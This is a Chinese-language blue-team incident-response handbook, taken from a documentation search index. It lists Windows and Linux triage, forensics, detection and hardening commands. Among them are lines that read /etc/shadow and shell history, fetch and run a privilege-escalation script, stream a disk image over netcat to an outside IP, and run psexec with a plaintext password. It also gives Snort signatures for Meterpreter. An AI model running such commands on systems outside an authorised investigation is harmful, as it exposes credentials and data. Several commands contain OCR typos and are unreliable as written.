\"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" /s C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\User Shell Folders\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\explorer\\Shell Folders\" C:\\> reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\explorer\\ShellExecuteHooks\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\" /s C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Runonce\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Winlogon\\Userinit\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\shellServiceObjectDelayLoad\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Schedule\\TaskCache\\Tasks\" /s C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Windows\" /f Appinit_DLLs C:\\> reg query \"HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\Winlogon\" /f Shell C:\\> reg query \"HKLM\\SOFTWARE\\Mic rosoft\\WindowsNT\\CurrentVersion\\Winlogon\" /f Userinit C:\\> reg query \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Systern\\Scripts\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\batfile\\shell\\open\\cornrnand\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\cornfile\\shell\\open\\cornrnand\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\exefile\\shell\\open\\command\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\htafile\\Shell\\Open\\Command\" C:\\> reg query \"HKLM\\SOFTWARE\\Classes\\piffile\\shell\\open\\command\" C:\\> reg query \"HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\" /s C:\\> reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\" C:\\> reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SessionManager\\KnownDLLs\" C:\\> reg query \"HKLM\\SYSTEM\\ControlSet001\\Control\\SessionManager\\KnownDLLs\" 7.\uff09\u53d6\u65e5\u5fd7\u6587\u4ef6 C:\\> wevtutil epl Security C:\\bak\\Security-logs.evtx C:\\> wevtutil epl System C:\\bak\\System-logs.evtx C:\\> wevtutil epl Application C:\\bak\\Application-logs.evtx 8.\uff09\u6587\u4ef6\u3001\u76ee\u5f55\u3001\u5171\u4eab\u4fe1\u606f C:\\> net use \\\\\u76ee\u6807IP C:\\> net share C:\\> net session C:\\> wmic volume list brief C:\\> wmic logicaldisk get description,filesystem,name,size C:\\> wmic share get name,path \\# \u67e5\u627e\u591a\u4e2a\u7c7b\u578b\u7684\u6587\u4ef6\u6216\u67d0\u4e2a\u6587\u4ef6 C:\\> dir /A /S /T:A *.exe *.dll *.bat *.PS1 *.zip C:\\> dir /A /S /T:A evil.exe \\# \u67e5\u627e2017/1/1\u4e4b\u540e\u521b\u5efa\u7684\u6587\u4ef6 C:\\> forfiles /p C:\\ /M *.exe /S /D +2017/1/1 /C \"cmd /c echo @fdate @ftime @path\" C:\\> for %G in (.exe, .dll, .bat, .ps) do forfiles -p \"C:\" -m *%G -s -d +2017/1/1 -c \"cmd /c echo @fdate @ftime @path\" \\# \u67e5\u627e\u6587\u4ef6\u5927\u5c0f>20MB\u7684\u6587\u4ef6 forfiles /S /M * /C \"cmd /c if @fsize GEQ 2097152 echo @path @fsize\" \\# \u5728Alternate Data Streams\u4e2d\u67e5\u627e\u6587\u4ef6 C:\\> streams -s \u6587\u4ef6\u6216\u76ee\u5f55 \\# \u68c0\u67e5\u6570\u5b57\u7b7e\u540d\uff0cvt\u626b\u63cf C:\\> sigcheck -e -u -vr -s C:\\ C:\\> listdlls.exe -u \\# \u626b\u63cf\u75c5\u6bd2 C:\\> \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -SignatureUpdate C:\\> \"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -Scan 4.2 ) LIVE TRIAGE\uff08\u6536\u96c6\u8fd0\u884c\u65f6\u7cfb\u7edf\u4fe1\u606f\uff09 4.2.1 LINUX\u7bc7 1.\uff09\u7cfb\u7edf\u4fe1\u606f uname -a uptime timedatectl mount 2.\uff09\u7528\u6237\u4fe1\u606f w lastlog last faillog -a cat /etc/passwd cat /etc/shadow cat /etc/group cat /etc/sudoers \\# \u67e5\u627eUID\u4e3a0\u7684\u7528\u6237 awk -F: '($3 == \"0\") {print}' /etc/passwd egrep ':0+' /etc/passwd cat /root/.ssh/authorized_keys lsof -u root cat /root/.bash_history 3.\uff09\u7f51\u7edc\u4fe1\u606f \\# \u67e5\u770b\u7f51\u7edc\u63a5\u53e3 ifconfig OR ip a l \\# \u67e5\u770b\u76d1\u542c\u7aef\u53e3 netstat -tupnl \\# \u67e5\u770b\u7f51\u7edc\u8fde\u63a5 netstat -tupnla netstat -tupnlax \\# \u8def\u7531\u4fe1\u606f route OR netstat -r OR ip r l \\# ARP\u8868 arp -ne \\# \u76d1\u542c\u7aef\u53e3\u7684\u8fdb\u7a0b lsof -i 4.\uff09\u670d\u52a1\u4fe1\u606f \\# \u5217\u51fa\u6240\u6709\u8fdb\u7a0b ps aux OR ps -ef \\# \u5df2\u52a0\u8f7d\u5185\u6838\u6a21\u5757 lsmod \\# \u6253\u5f00\u7684\u6587\u4ef6 lsof lsof -c sshd lsof -p PID lsof -nPi | cut -f1 -d\" \" | uniq | tail -n +2 \\# \u76d1\u63a7\u65e5\u5fd7 less +F /var/log/messages tail -F /var/log/messages journalctl -u ssh.service -f \\# \u5217\u51fa\u6240\u6709\u670d\u52a1 chkconfig --list systemctl list-units 5.\uff09\u7b56\u7565\u3001\u8865\u4e01\u3001\u73af\u5883\u53d8\u91cf\u4fe1\u606f \\# \u68c0\u67e5pam.d\u76ee\u5f55\u76f8\u5173\u6587\u4ef6 cat /etc/pam.d/common* \\# \u81ea\u542f\u52a8\u4fe1\u606f - \u8ba1\u5212\u4efb\u52a1 crontab -l crontab -u root -l cat /etc/crontab ls /etc/cron,* 6.\uff09\u547d\u4ee4\u5386\u53f2 cat /root/.*history 7.\uff09\u6587\u4ef6\u3001\u76ee\u5f55\u3001\u5171\u4eab\u4fe1\u606f df -ah ls -lhcta /etc/init.d/ stat -x filename file filename \\# \u7279\u6b8a\u5c5e\u6027\u6587\u4ef6 lsattr -R / | grep \"\\-i-\" \\# \u5168\u5c40\u53ef\u5199\u6587\u4ef6 find / -xdev -type d \\( -perm -0002 -a ! -perm -1000 \\) -print \\# \u67d0\u65f6\u95f4\u70b9\u4e4b\u540e\u65b0\u5efa\u7684\u6587\u4ef6 find / -newermt 2018-01-22q \\# \u6253\u5370\u6587\u4ef6\u7684\u6240\u6709\u5c5e\u6027\u4fe1\u606f find /labs -printf \"%m;%Ax;%AT;%Tx;%TT;%Cx;%CT;%U;%G;%s;%p\\n\" \\# \u67e5\u770b\u6587\u4ef6\u7684\u5143\u6570\u636e stat \u6587\u4ef6\u540d 8.) \u7b80\u5355\u57fa\u7ebf\u68c0\u67e5 wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/1_x/unix-privesc-check && ./unix-privesc-check > output.txt 9.) \u68c0\u6d4brootkit chkrootkit rkhunter --update && rkhunter -check tiger && less /var/log/tiger/security.report.* lynis && lynis audit system && more /var/logs/lynis. log 10.) Fastir Collector Linux\uff0c\u6536\u96c6artefacts\uff0c\u5305\u62ec\uff1a\u5185\u6838\u7248\u672c\u3001\u5185\u6838\u6a21\u5757\u3001\u7f51\u5361\u3001\u7cfb\u7edf\u7248\u672c\u3001\u4e3b\u673a\u540d\u3001\u767b\u5f55\u3001\u7f51\u7edc\u8fde\u63a5\u3001SSH know_host\u3001\u65e5\u5fd7\u6587\u4ef6\u3001\u8fdb\u7a0b\u6570\u636e\u3001\u81ea\u542f\u52a8\u7b49\u4fe1\u606f wget https://raw.githubusercontent.com/SekoiaLab/Fastir_Collector_Linux/master/fastIR_collector_linux.pypython fastIR_collector_linux.py --debug --output_dir output 11.) Sysdig and Sysdig Falco \u884c\u4e3a\u76d1\u63a7 \\# \u89c2\u5bdfroot\u7528\u6237\u67e5\u770b\u8fc7\u7684\u76ee\u5f55 sysdig -p\"%evt.arg.path\" \"evt.type=chdir and user.name=root\" \\# \u89c2\u5bdfSSHD\u884c\u4e3a sysdig -A -c echo_fds fd.name=/dev/ptmx and proc.name=sshd \\# id\u4e3a5459\u7684\u767b\u5f55shell\u6267\u884c\u8fc7\u7684\u6240\u6709\u547d\u4ee4 sysdig -r trace.scap.gz -c spy_users proc.loginshellid=5459 \\# \u5b89\u88c5\uff0c\u542f\u52a8falco curl -s https://s3.amazonaws.com/download.draios.com/DRAIOS-GPG-KEY.public | apt-key add - curl -s -o /etc/apt/sources.list.d/draios.list http://download.draios.com/stable/deb/draios.list sudo apt update apt -y install falco modprobe sysdig-probe service falco start falco 4.3 ) \u75c5\u6bd2\u6837\u672c\u5206\u6790 \\# \u9759\u6001\u5206\u6790 \\# \u6302\u8f7dSysinternals\u5de5\u5177\u96c6 \\\\live.sysinternals.com\\tools \\# \u68c0\u67e5\u6570\u5b57\u7b7e\u540d C:\\> sigcheck.exe -u -e C:\\malware C:\\> sigcheck.exe -vt malware.exe \\# 16\u673a\u5236\u548cASCII\u65b9\u5f0f\u67e5\u770bPE\u6587\u4ef6 hexdump -C -n 500 malware.exe od -x mailware.exe xxd malware.exe strings -a malware.exe | more \\# \u5185\u5b58\u955c\u50cf\u5206\u6790 python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 malfind -D /output python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 malfind -p PID -D /output python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 pslist python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 pstree python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 dlllist python vol.py -f malware_memory_dump.raw -profile=Win7SPFix64 dlldump -D /output \\# HASH\u5206\u6790 curl -v --request POST --url https://www.virustotal.com/vtapi/v2/file/report' -d apikey=VT API KEY -d 'resource=\u6837\u672c\u6587\u4ef6hash' curl -v -F 'file=malware.exe' -F apikey=VT API KEY>https://www.virustotal.com/vtapi/v2/file/scan whois -h hash,cymru.com \u6837\u672c\u6587\u4ef6hash \\# \u83b7\u53d6\u78c1\u76d8\u548c\u5185\u5b58\u955c\u50cf \\# WINDOWS C:\\> psexec.exe \\\\IP -u <DOMAIN>\\administrator -p 123 -c mdd_l.3.exe --o C:\\memory.dmp C:\\> dc3dd.exe if=\\\\.\\c: of=d:\\diskiamge.dd hash=md5 log=d:\\output.log \\# LINUX dd if=/dev/fmem of=/tmp/mem_dump.dd \\# \u4f7f\u7528LiME get https://github.com/504ensicslabs/LiME/archive/master.zip unzip master.zip cd LiME-master/src make cp lime-*.ko /media/USB/ insmod lime-3.13.0-79-generic.ko \"path=/media/USB/mem_dump.lime format= raw\" \\# \u4ece\u5185\u5b58\u4e2d\u62f7\u8d1dPE\u6587\u4ef6 cp /proc/\u8fdb\u7a0bID/exe /output \\# \u521b\u5efa\u8fdb\u7a0bcore dump gcore \u8fdb\u7a0bID strings -a gcore.* | more dd if=/dev/sda of=/root/sda.dd dd if=/dev/sda | ssh root@RemoteIP \"dd of=/root/sda.dd\" \\# \u901a\u8fc7netcat\u4f20\u9001\u63a5\u6536\u955c\u50cf\u6587\u4ef6 bzip2 -c /dev/sda | nc 8.8.8.8 53 nc -p 53 -l | bzip2 -d | dd of=/root/sda.dd 5. ) \u5e38\u7528\u6280\u5de7\uff08TIPS & TRICKS\uff09 \u00b6 5.1 ) \u6280\u5de7 5.1.1 WINDOWS\u7cfb\u7edf\u7bc7 \\# \u5c06\u547d\u4ee4\u7ed3\u679c\u901a\u8fc7\u7ba1\u9053\u8f93\u51fa\u5230\u7c98\u5e16\u677f\uff0c\u7136\u540e\u5c06\u7c98\u5e16\u677f\u7684\u5185\u5bb9\u91cd\u5b9a\u5411\u5230\u6587\u4ef6 C:\\> some_command.exe | clip PS C:\\> Get-Clipboard > clip.txt \\# \u68c0\u67e5\u6ce8\u518c\u8868\u67d0\u8def\u5f84\u662f\u5426\u5b58\u5728 PS C:\\> Test-Path \"HKCU:\\Software\\Microsoft\\123\" \\# \u53ef\u9760\u6587\u4ef6\u590d\u5236 robocopy c:\\src \\\\\u76ee\u6807\u8ba1\u7b97\u673a\\dst /E \\# \u68c0\u67e5\u67d0\u76ee\u5f55\u662f\u5426\u5b58\u5728ps1,vbs\u6269\u5c55\u7684\u6587\u4ef6 PS C:\\> Test-Path C:\\Scripts\\Archive\\* -include *.ps1, *.vbs \\# \u5408\u5e76\u591a\u4e2a\u6587\u4ef6 C:\\> type 1.txt 2.txt > output.txt \\# \u591a\u4e2a\u684c\u9762\u7a97\u53e3\uff08Desktops\uff09 C:\\>\"%ProgramFiles%\\Internet Explorer\\iexplore.exe\" https://live.sysinternals.com/desktops.exe \\# \u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u6267\u884c\u547d\u4ee4 C:\\> psexec.exe \\\\\u8fdc\u7a0b\u8ba1\u7b97\u673a -u admin -p 123 /c c:\\123.exe PS C:\\> Invoke-Command -\u8fdc\u7a0b\u8ba1\u7b97\u673a { ls } \\# \u6bd4\u8f83\u4e24\u4e2a\u6587\u4ef6\u7684\u5dee\u5f02 PS C:\\> Compare-Object (-Content 1.log) -DifferenceObject (Get-Content 2.log) \\# \u8fdb\u5236\u8f6c\u6362\u4e0e\u7f16\u7801 C:\\> set /a 0xff PS C:\\> 0xff C:\\> certutil -decode BASE64\u7f16\u7801\u6587\u4ef6 output.file \\# \u89e3\u7801XOR\uff0c\u641c\u7d22\u5173\u952e\u5b57\uff1ahttp C:\\> xorsearch.exe -i -s input.file http 5.1.2 LINUX\u7cfb\u7edf\u7bc7 \\# \u901a\u8fc7ssh\u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\u6293\u5305 ssh root@8.8.8.8 tcpdump -i any -U -s 0 -w - 'not port 22' 5.2 ) SNORT # SNORT\u89c4\u5219\u68c0\u6d4bMeterpreter \\# Snort rules by Didier Stevens (http://DidierStevens.com) alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:\"Metasploit Meterpreter\"; flow:to_server,established; content:\"RECV\"; http_client_body; depth:4; fast_pattern; isdataat:!0,relative; urilen:23<>24,norm; content:\"POST\"; pcre:\"/^\\/[a-z0-9]{4,5}_[a-z0-9]{16}\\/$/Ui\"; classtype:trojan-activity; reference:url,blog.didierstevens.com/2015/05/11/detecting-network-traffic-from-metasploits-meterpreter-reverse-http-module/; sid:1618008; rev:1;) https://didierstevens.com/files/software/snort-rules-V0_0_1.zip \\# SNORT\u89c4\u5219\u68c0\u6d4bPSEXEC alert tcp $HOME_NET any -> $HOME_NET [139,445] (msg:\"POLICY-OTHER use of psexec remote administration tool\"; flow:to_server,established; content:\"|FF|SMB|A2|\"; depth:5; offset:4; content:\"|5C 00|p|00|s|00|e|00|x|00|e|00|c|00|s|00|v|00|c\"; nocase; metadata:service netbios-ssn; reference:url,technet.microsoft.com/en-us/sysinternals/bb897553.aspx; classtype:policy-violation; sid:24008; rev:1;) alert tcp $HOME_NET any -> $HOME_NET [139,445] (msg:\"POLICY-OTHER use of psexec remote administration tool SMBv2\"; flow:to_server,established; content:\"|FE|SMB\"; depth:8; nocase; content:\"|05 00|\"; within:2; distance:8; content:\"P|00|S||E|00|X|00|E|00|S|00|V|00|C|00|\"; fast_pattern:only; metadata:service netbios-ssn; reference:url,technet.microsoft.com/en-us/sysinternals/bb897553.aspx; classtype:policy-violation; sid:30281; rev:1;) 5.3 ) Bro NSM # \u68c0\u6d4b\u6a2a\u5411\u6e17\u900f wget https://raw.githubusercontent.com/richiercyrus/Bro-Scripts/master/detect-mal-smb-files.bro bro -r faf-exercise.pcap detect-mal-smb-files.bro less notice.log \\# \u68c0\u6d4b\u52d2\u7d22\u8f6f\u4ef6 wget https://raw.githubusercontent.com/fox-it/bro-scripts/master/smb-ransomware/smb-ransomware.bro bro -r faf-exercise.pcap smb-ransomware.bro 5.4 ) \u68c0\u6d4bDOS/DDOS # \u68c0\u6d4b\u653b\u51fb\u7c7b\u578bSYN Flood\uff0cICMP Flood\uff0cUDP Flood tshark -r 001.pcap -q -z io,phs tshark -c 1000 - -z io,phs tcpdump -tnr $ | awk -F '.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -n | tail tcpdump -qnn \"tcp[tcpflags] & (tcp-syn) != 0\" netstat -s tcpdump -nn not arp and not icmp and not udp netstat -n | awk '{print $6}' | sort | uniq -c | sort -nr | head \\# \u5e94\u7528\u5c42 tshark -c 10000 -T fields -e http.host | sort | uniq -c | sort -r | head -n 10 tshark -r capture6 -T fields -e http.request.full\\_uri | sort | uniq -c | sort -r | head -n 10c tcpdump -n 'tcp[32:4] = 0x47455420' | cut -f 7- -d\":\" \\# \u67e5\u627ehttp\u8bf7\u6c42\u4e2d\u5305\u542b\uff1aGIF,ZIP,JPEG,PDF,PNG\u6269\u5c55\u7684\u6570\u636e\u5305 tshark -Y \"http contains \"ff:d8\"\" || \"http contains \"GIF89a\"\" || \"http contains \"\\x50\\x4B\\x03\\x04\"\" || \"http contains \"\\xff\\xd8\"\" || \"http contains \"%PDF\"\" || \"http contains \"\\x89\\x50\\x4E\\x47\"\" \u53d6'user-agent'\u548crefer\u5b57\u6bb5 tcpdump -c 1000 -Ann I grep -Ei 'user-agent' | sort | uniq -c | sort -nr | head -10 tcpdump -i en0 -A -s 500 | grep -i refer \\# \u7b2c\u4e8c\u5c42\u653b\u51fb tcpdump 'arp or icmp' tcpdump -tnr 001.pcap ARP | awk -F '.' '{print $1\".\"$2\".\"$3\".\"$4}' | sort | uniq -c | sort -n | tail tshark -r 001.pcap -q -z io,phs | grep arp.duplicate-address-detected 5.5 ) \u84dd\u961f\u5175\u5668\u8c31 6.4.1\uff09 KALI \u6e17\u900f\u6d4b\u8bd5\u53d1\u884c\u7248 https://www.kali.org 6.4.2\uff09SIFT SANS \u53d6\u8bc1\u5de5\u5177\u7bb1 http://sift.readthedocs.org/ 6.4.3\uff09REMNUX \u8f6f\u4ef6\u9006\u5411\u548c\u75c5\u6bd2\u5206\u6790\u53d1\u884c\u7248 https://remnux.org 6.4.4\uff09OPENVAS http://www.openvas.org 6.4.5\uff09Security Onion \u5165\u4fb5\u68c0\u6d4b\u3001\u7f51\u7edc\u5b89\u5168\u76d1\u63a7\u3001\u65e5\u5fd7\u5206\u6790\u53d1\u884c\u7248 https://securityonion.net 6.4.6\uff09OSSEC \u5f00\u6e90\u4e3b\u673a\u5165\u4fb5\u68c0\u6d4b\u7cfb\u7edf http://ossec.github.io \u6587\u6863\u7ef4\u62a4 \u00b6 \u9879\u76ee\u5730\u5740\uff1a https://github.com/Zer0d0y/BTFM \uff0c\u6b22\u8fce\u6709\u7ecf\u9a8c\u7684\u670b\u53cb\u4e00\u8d77\u7ef4\u62a4\uff01","title":"\u84dd\u961f\u624b\u518c"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/#0","text":"1 ) \u7ec4\u7ec7\u7ed3\u6784\u56fe 2 ) \u5168\u7f51\u62d3\u6251\u56fe 3 ) \u5404\u7cfb\u7edf\u903b\u8f91\u7ed3\u6784\u56fe 4 ) \u5404\u7cfb\u7edf\u4e4b\u95f4\u7684\u8c03\u7528\u5173\u7cfb 5 ) \u6570\u636e\u6d41\u5173\u7cfb 6 ) \u6838\u5fc3\u8d44\u4ea7\u6e05\u5355 7 ) \u5e94\u6025\u54cd\u5e94\u8ba1\u5212 8 ) \u4e1a\u52a1\u8fde\u7eed\u6027\u8ba1\u5212 9 ) \u707e\u96be\u6062\u590d\u8ba1\u5212","title":"0. ) \u51c6\u5907\u5de5\u4f5c"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/#1","text":"1.1 ) \u7aef\u53e3\u626b\u63cf\u548c\u6f0f\u6d1e\u68c0\u6d4b \u4e3b\u673a\u53d1\u73b0\uff08Ping\u63a2\u6d4b\uff09\uff1a # nmap -sn -PE IP\u5730\u5740\u6216\u5730\u5740\u6bb5 \u7aef\u53e3\u626b\u63cf\uff1a # nmap \u2013open IP\u5730\u5740\u6216\u5730\u5740\u6bb5 \u670d\u52a1\u7248\u672c\u68c0\u6d4b\uff1a # nmap -sV IP\u5730\u5740\u6216\u5730\u5740\u6bb5 \u626b\u63cf\u591a\u4e2a\u7aef\u53e3\uff1a # nmap -p 80,443 IP\u5730\u5740\u6216\u5730\u5740\u6bb5 UDP\u7aef\u53e3\u626b\u63cf\uff1a # nmap -sU -p 53 IP\u5730\u5740\u6216\u5730\u5740\u6bb5 TCP/UDP\u7aef\u53e3\u626b\u63cf\uff08-Pn \u8df3\u8fc7\u4e3b\u673a\u53d1\u73b0\uff09\uff1a # nmap -v -Pn -SU -ST -p U:53,111,137,T:21- 25,80,139,8080 IP\u5730\u5740\u6216\u5730\u5740\u6bb5 Nessus\u6f0f\u6d1e\u68c0\u6d4b\uff1a # nessus -q -x -T html \u670d\u52a1\u5668IP \u670d\u52a1\u5668\u7aef\u53e3 \u7ba1\u7406\u5458\u5e10\u53f7 \u5bc6\u7801 \u76ee\u6807.txt \u8f93\u51fa\u62a5\u544a.html OPENVAS\u6f0f\u6d1e\u68c0\u6d4b\uff1a # apt -y install pcregrep # wget https://goo.gl/TYbLwE # chmod +x openvas-automate.sh && ./openvas-automate.sh \u76ee\u6807IP 1.2 ) WINDOWS\u7cfb\u7edf\u7bc7 1.2.1 \u7f51\u7edc\u53d1\u73b0 \u57fa\u672c\u7f51\u7edc\u53d1\u73b0 # C:> net view /all # C:> net view \\\u4e3b\u673a\u540d Ping\u63a2\u6d4b # C:> for /L %I in (1,1,254) do ping -w 30 -n 1 192.168.1.%I | find \u201c\u56de\u590d\u201d >> \u8f93\u51fa.txt 1.2.2 DHCP \u542f\u7528DHCP\u670d\u52a1\u5668\u65e5\u5fd7\u529f\u80fd\uff1a # C:> reg add HKLM\\System\\CurrentControlSet\\Services\\DhcpServer\\Parameters /v ActivityLogFlag /t REG_DWORD /d 1 \u9ed8\u8ba4\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84\uff1a C:> %windir%\\System32\\Dhcp 1.2.3 DNS \u542f\u7528DNS\u670d\u52a1\u5668\u65e5\u5fd7\u529f\u80fd\uff1a # C:> DNSCmd DNS\u670d\u52a1\u5668\u540d /config /logLevel 0x8100F331 # \u914d\u7f6e\u65e5\u5fd7\u6587\u4ef6\u8def\u5f84: C:> DNSCmd DNS\u670d\u52a1\u5668\u540d /config /LogFilePath C:\\dns.log # \u914d\u7f6e\u65e5\u5fd7\u6587\u4ef6\u5927\u5c0f: C:> DNSCmd DNS\u670d\u52a1\u5668\u540d /config /logfilemaxsize 0xffffffff 1.2.4 \u54c8\u5e0c\u503c \u6587\u4ef6\u6821\u9a8c\u548c\u5b8c\u6574\u6027\u9a8c\u8bc1\uff08FCIV\uff09\uff1a Ref\uff1a http://support2.microsoft.com/kb/841290 # \u8ba1\u7b97\u5355\u4e2a\u6587\u4ef6hash\u503c: C:> fciv.exe \u6587\u4ef6\u540d # \u8ba1\u7b97C\u76d8\u6240\u6709\u6587\u4ef6\u7684\u54c8\u5e02\u503c\u5e76\u628a\u7ed3\u679c\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d: C:> fciv.exe c: -r -sha1 -xml \u7ed3\u679c.xml # \u5217\u51fa\u6240\u6709hash\u503c: C:> fciv.exe -list -sha1 -xml \u7ed3\u679c.xml # certutil & PowerShell\u65b9\u6cd5 # certutil -hashfile \u6587\u4ef6\u540d SHA1 # PS C:> Get-FileHash \u6587\u4ef6\u540d | Format-List # PS C:> Get-FileHash -algorithm md5 \u6587\u4ef6\u540d 1.2.5 NETBIOS nbtstat \u626b\u63cf # C:> nbtstat -A \u76ee\u6807IP\u5730\u5740 NetBIOS\u7f13\u5b58 # C:> nbtstat -c \u6279\u91cf\u626b\u63cf # C:> for /L %I in (1,1,254) do nbtstat -An 192.168.1.%I 1.2.6 \u5fae\u8f6f\u57fa\u7ebf\u5b89\u5168\u5206\u6790\u5668(MBSA) \u626b\u63cf\u5355\u4e2aIP # C:> mbsacli.exe /target IP\u5730\u5740 /n os+iis+sql+password \u626b\u63cfIP\u5730\u5740\u6bb5 # C:> mbsacli.exe /r IP\u5730\u5740\u6bb5 /n os+iis+sql+password 1.3 ) LINUX\u7cfb\u7edf\u7bc7 1.3.1 \u7f51\u7edc\u53d1\u73b0 \u67e5\u770b\u5f00\u653e\u7684SMB\u5171\u4eab # smbclient -L \u76ee\u6807\u4e3b\u673a\u540d Ping\u63a2\u6d4b \\# for ip in $(seq 1 254); do ping -c1 -w2 192.168.1.$ip>/dev/null; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done 1.3.2 DHCP DHCP\u65e5\u5fd7\u67e5\u8be2 RHEL/CentOS # cat /var/lib/dhcpd/dhcpd. leases Debian/Ubuntu # grep -Ei \u2018dhcp\u2019 /var/log/syslog.1 1.3.3 DNS DNS\u65e5\u5fd7\u67e5\u8be2 # rndc querylog && tail -f /var/log/messages | grep named 1.3.4 \u54c8\u5e0c\u503c \u8ba1\u7b97/sbin\u76ee\u5f55\u4e0b\u6240\u6709\u53ef\u6267\u884c\u6587\u4ef6\u7684HASH\u503c # find /sbin -type f -exec md5sum {} >> md5sums.txt \\; # md5deep -rs /sbin > md5sums.txt 1.3.5 NETBIOS nbtstat \u626b\u63cf # nbtscan \u76ee\u6807IP\u5730\u5740\u6216IP\u5730\u5740\u6bb5 \u4e3e\u4f8b\uff1anbtscan 192.168.1.2-100","title":"1. ) \u7b80\u5355\u5b89\u5168\u8bc4\u4f30"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/#2","text":"2.1 ) WINDOWS\u7cfb\u7edf\u7bc7 2.1.1 \u7981\u7528/\u505c\u6b62\u670d\u52a1 # C:> sc query # C:> sc config \u201c\u670d\u52a1\u540d\u201d start= disabled # C:> sc stop \u201c\u670d\u52a1\u540d\u201d # C:> wmic service where name=\u201d\u670d\u52a1\u540d\u201d call ChangeStartmode Disabled 2.1.2 \u9632\u706b\u5899\u7ba1\u7406 # \u5217\u51fa\u6240\u6709\u89c4\u5219: # C:> netsh advfirewall firewall show rule name=all # \u542f\u7528\u6216\u7981\u7528\u9632\u706b\u5899: C:> netsh advfirewall set currentprofile state on C:> netsh advfirewall set currentprofile firewallpolicy blockinboundalways,allowoutbound C:> netsh advfirewall set publicprofile state on C:> netsh advfirewall set privateprofile state on C:> netsh advfirewall set domainprofile state on C:> netsh advfirewall set allprofile state on C:> netsh advfirewall set allprof ile state off # \u914d\u7f6e\u4e3e\u4f8b\uff1a netsh advfirewall firewall add rule name=\"\u5f00\u653eTCP:80\u7aef\u53e3\" dir=in action=allow protocol=TCP localport=80 netsh advfirewall firewall add rule name=\"\u5f00\u653eTCP:443\u7aef\u53e3\" dir=in action=allow protocol=TCP localport=443 netsh advfirewall firewall add rule name=\"\u5c4f\u853dTCP:445\u7aef\u53e3\" dir=in action=block protocol=TCP localport=445 netsh advfirewall firewall add rule name=\"\u5141\u8bb8MyApp\" dir=in action=allow program=\"C:\\MyApp\\MyApp.exe\" enable=yes 2.1.3 \u6e05\u9664DNS\u7f13\u5b58\u548cNetios\u7f13\u5b58 # C:> ipconfig /flushdns # C:> nbtstat -R 2.1.4 \u5e94\u7528\u63a7\u5236 # AppLocker\u914d\u7f6e \\# \u5bfc\u5165Applocker\u6a21\u5757 PS C:\\> import-module Applocker \\# \u67e5\u770bsystem32\u76ee\u5f55\u4e0b\u6240\u6709exe\u6587\u4ef6\u7684Applocker\u4fe1\u606f PS C:\\> Get-ApplockerFileinformation -Directory C:\\Windows\\System32\\ -Recurse -FileType Exe \\# \u589e\u52a0\u4e00\u6761\u9488\u5bf9system32\u76ee\u5f55\u4e0b\u6240\u6709\u7684exe\u6587\u4ef6\u7684\u5141\u8bb8\u89c4\u5219 PS C:\\> Get-Childitem C:\\Windows\\System32\\*,exe | Get-ApplockerFileinformation | New-ApplockerPolicy -RuleType Publisher, Hash -User Everyone -RuleNamePrefix System32 2.1.5 IPSEC # 1.\uff09\u4f7f\u7528\u9884\u5171\u4eab\u5bc6\u94a5\u7684\u65b9\u5f0f\u65b0\u5efa\u4e00\u6761IPSEC\u672c\u5730\u5b89\u5168\u7b56\u7565\uff0c\u5e94\u7528\u5230\u6240\u6709\u8fde\u63a5\u548c\u534f\u8bae C:\\> netsh ipsec static add filter filterlist=MyIPsecFilter srcaddr=Any dstaddr=Any protocol=ANY C:\\> netsh 